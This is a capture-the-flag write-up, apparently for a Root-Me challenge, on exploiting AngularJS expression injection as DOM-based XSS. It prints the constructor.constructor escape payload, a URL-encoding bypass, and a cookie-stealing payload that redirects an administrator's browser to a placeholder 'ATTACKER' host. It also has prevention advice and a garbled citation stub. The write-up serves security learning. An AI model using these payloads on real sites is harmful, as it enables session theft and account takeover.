# DOM-Based XSS - AngularJS Expression Injection
[Root-Me Challenge](https://www.root-me.org/?page=validation&id_challenge=2952&id_auteur=1089475&lang=en)
## Lab Overview

This lab demonstrates a **DOM-Based XSS** vulnerability in an application built with **AngularJS**.

Unlike traditional XSS, AngularJS can evaluate expressions inside:

```html
{{ expression }}
```

If user-controlled input reaches an AngularJS template without proper sanitization, attackers may execute arbitrary JavaScript through Angular expressions.

Proof: :contentReference[oaicite:0]{index=0}

---

# Identifying the Injection Point

The application reflected user input inside a script:

```javascript
<script>
var name = 'test';
var encoded = '';

for(let i = 0; i < name.length; i++) {
    encoded += name[i] ^ Math.floor(Math.random() * name.length);
}

encoded = Math.abs(
    encoded ^ Math.floor(Math.random() * name.length)
);

document.getElementById('name_encoded').innerText += ' ' + encoded;
</script>
```

At first glance it appeared the application encoded the supplied value before displaying it.

This suggested that traditional payloads might not work directly.

---

# Why Test AngularJS Payloads?

When a page uses AngularJS, user input may eventually be processed by Angular's template engine.

Angular expressions look like:

```html
{{ 7 * 7 }}
```

which Angular evaluates as:

```text
49
```

If attacker input reaches an Angular expression context, JavaScript execution may become possible.

---

# Initial Payload

Tried the classic AngularJS expression:

```html
{{constructor.constructor("alert(1)")()}}
```

This did not execute successfully.

---

# Why It Failed

The application processed special characters before Angular interpreted them.

Characters such as:

```text
{
}
(
)
"
'
```

were altered during transmission.

As a result, Angular never received the intended expression.

---

# URL Encoding Bypass

Encoded payload:

```text
%7B%7Bconstructor.constructor%28%22alert%281%29%22%29%28%29%7D%7D
```

Decoded version:

```html
{{constructor.constructor("alert(1)")()}}
```

After URL encoding, the application accepted the payload and Angular evaluated it.

Result:

```javascript
alert(1)
```
<img width="1842" height="665" alt="image" src="https://github.com/user-attachments/assets/a6070c8c-b483-47d1-9d76-07e98103fce1" />

executed successfully.

---

# Understanding the Payload

Expression:

```javascript
constructor.constructor("alert(1)")()
```

Breakdown:

### First Constructor

```javascript
constructor
```

references the constructor of the current object.

---

### Second Constructor

```javascript
constructor.constructor
```

resolves to JavaScript's:

```javascript
Function
```

constructor.

Equivalent to:

```javascript
Function("alert(1)")
```

---

### Final Execution

```javascript
Function("alert(1)")()
```

creates and immediately executes a new function.

Equivalent to:

```javascript
eval("alert(1)")
```

This results in arbitrary JavaScript execution.

---

# Cookie Exfiltration Payload

After confirming code execution, crafted a payload that redirects the victim to an external server with their cookies appended to the URL.

Payload:

```html
{{constructor.constructor(
'document.location="http://ATTACKER/?"+document.cookie'
)()}}
```

URL-encoded version:

```text
%7B%7Bconstructor.constructor%28%27document.location%3D%22http%3A%2F%2FATTACKER%2F%3F%22%2Bdocument.cookie%27%29%28%29%7D%7D
```

---

# How It Works

Angular evaluates:

```javascript
constructor.constructor(
'document.location="http://ATTACKER/?"+document.cookie'
)()
```

which becomes:

```javascript
Function(
'document.location="http://ATTACKER/?"+document.cookie'
)()
```

The browser executes:

```javascript
document.location =
"http://ATTACKER/?" + document.cookie;
```

---

# Execution Flow

```text
User Visits Malicious URL
          ↓
Angular Parses Expression
          ↓
Function Constructor Created
          ↓
JavaScript Executes
          ↓
document.cookie Read
          ↓
Browser Redirects
          ↓
Request Sent To Attacker
```

Example request:

```text
http://ATTACKER/?session=abc123
```
<img width="1252" height="490" alt="image" src="https://github.com/user-attachments/assets/d2ceca71-36fc-417b-bdb9-f4909eec4c37" />

The collaborator server receives the victim's cookie data.

---

# Delivering the Payload

The complete malicious URL was submitted through the application's contact mechanism.

When the administrator visited the supplied link:

1. Angular processed the expression.
2. JavaScript executed in the admin's browser.
3. Browser redirected to the collaborator server.
4. Session data was transmitted.

The collaborator interaction confirmed successful exploitation.

---

# Why This Is DOM-Based XSS

The server does not execute the payload.

Instead:

```text
User Input
      ↓
Angular Template
      ↓
Angular Evaluates Expression
      ↓
Browser Executes JavaScript
```

The vulnerability exists entirely in client-side processing.

---

# Impact

Successful exploitation may lead to:

- Session hijacking
- Administrator account takeover
- Sensitive information disclosure
- Unauthorized actions
- Full compromise of affected user sessions

Impact depends on protections such as:

- HttpOnly cookies
- CSP policies
- Session handling mechanisms

---

# Key Learnings

- AngularJS expressions can become dangerous execution sinks.
- `constructor.constructor()` is a common AngularJS sandbox escape technique.
- URL encoding can bypass input handling restrictions.
- DOM-Based XSS occurs entirely within browser-side code.
- Framework-specific payloads are often required when traditional XSS payloads fail.
- Always test for AngularJS expression injection when Angular templates process user input.

---

# Prevention

- Never render untrusted data inside Angular expressions.
- Upgrade outdated AngularJS versions.
- Use strict contextual escaping.
- Implement strong Content Security Policies (CSP).
- Treat all user-controlled data as untrusted.
- Disable expression evaluation on untrusted content whenever possible.
